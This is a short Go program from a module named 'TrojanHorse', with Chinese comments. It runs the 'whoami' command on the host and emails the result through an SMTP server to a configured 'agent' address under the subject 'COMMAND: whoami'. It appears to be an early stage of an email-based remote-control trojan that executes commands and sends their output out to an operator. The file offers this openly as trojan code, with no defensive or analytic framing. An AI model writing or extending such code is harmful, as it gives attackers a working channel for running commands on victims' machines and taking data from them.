package main

import (
	"TrojanHorse/email"
	"fmt"
	"os/exec"

	"github.com/spf13/viper"
)

func main() {
	// 读取配置文件
	viper.SetConfigFile("./config/config.yaml")
	err := viper.ReadInConfig()
	if err != nil {
		panic(fmt.Errorf("无法读取配置文件: %s", err))
	}

	// 初始化SMTP客户端
	smtpClient := email.NewSMTPClient(
		viper.GetString("smtp.host"),
		viper.GetString("smtp.port"),
		viper.GetString("smtp.username"),
		viper.GetString("smtp.password"), // ✅ 替换为 password
	)

	// 执行whoami命令
	out, err := exec.Command("whoami").Output()
	if err != nil {
		panic(fmt.Errorf("执行命令失败: %s", err))
	}

	// 发送测试邮件
	err = smtpClient.SendEmail(
		viper.GetString("agent_email"), // 发给 agent
		"COMMAND: whoami",              // 设置主题
		string(out),                    // 邮件正文
		nil,
	)
	if err != nil {
		panic(fmt.Errorf("发送邮件失败: %s", err))
	}

	fmt.Println("测试邮件已成功发送")
}
